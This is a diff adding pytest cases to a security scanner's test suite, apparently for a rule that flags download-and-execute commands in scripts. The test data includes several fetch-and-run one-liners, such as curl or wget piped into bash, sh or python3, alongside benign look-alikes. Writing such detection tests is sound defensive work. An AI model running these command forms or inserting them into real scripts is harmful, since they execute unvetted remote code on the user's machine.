@@ -290,6 +290,28 @@ class TestRuleH005DownloadExecute:
         ctx = _ctx(content=b"wget http://example.com/file.zip", is_script=True)
         assert _r_download_execute(ctx, "H005") is None
 
+    @pytest.mark.parametrize("content", [
+        b"curl -fsSL http://x/a | sudo bash",
+        b"curl -sL http://x/i | bash -s -- --yes",
+        b"curl -s http://x/a.py | python3",
+        b"wget -qO- http://x/a | /bin/sh",
+        b"bash <(curl -s http://x/a.sh)",
+        b'sh -c "$(curl -fsSL http://x/a.sh)"',
+        b"source <(curl -s http://x/a)",
+        b"echo start\ncurl -s http://x/a | sh\n",
+    ])
+    def test_new_forms_trigger(self, content: bytes) -> None:
+        assert _r_download_execute(_ctx(content=content, is_script=True), "H005") is not None
+
+    @pytest.mark.parametrize("content", [
+        b"curl -s http://api/health\necho x | sh -c 'true'\n",
+        b"# usa curl para checar\nfoo | bash\n",
+        b"curl -s http://x/a -o a.sh; bash a.sh",
+        b"curl -s http://x/a | jq .",
+    ])
+    def test_unrelated_download_and_shell_no_trigger(self, content: bytes) -> None:
+        assert _r_download_execute(_ctx(content=content, is_script=True), "H005") is None
+
 
 class TestRuleH006ReverseShell:
     def test_dev_tcp_triggers(self) -> None:
